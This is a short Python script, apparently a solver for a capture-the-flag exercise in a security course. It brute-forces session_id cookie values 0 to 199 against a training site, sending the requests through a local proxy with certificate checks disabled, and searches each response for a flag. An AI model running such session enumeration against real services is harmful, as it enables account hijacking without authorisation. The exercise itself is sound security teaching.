import requests
import re

proxies = {
  'https': 'http://127.0.0.1:8080',
}


queue = [""]
explored = set()
#simple BFS

for i in range(200):
        headers = {
  "Host": "q3.midterm.quoccacorp.com",
  "Cookie": f"session_id={i}",
  "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
  "Sec-Ch-Ua-Mobile": "?0",
  "Sec-Ch-Ua-Platform": "\"Linux\"",
  "Accept-Language": "en-US,en;q=0.9",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Sec-Fetch-Site": "same-site",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Referer": "https://midterm.quoccacorp.com/",
  "Accept-Encoding": "gzip, deflate, br",
  "Priority": "u=0, i"
}


   
        r = requests.get("https://q3.midterm.quoccacorp.com/", headers=headers,proxies=proxies, verify=False)
        flag = re.search(r"COMP6443\{.*?\}",r.text)
        if flag:
          print(flag.group(0))
          break
  

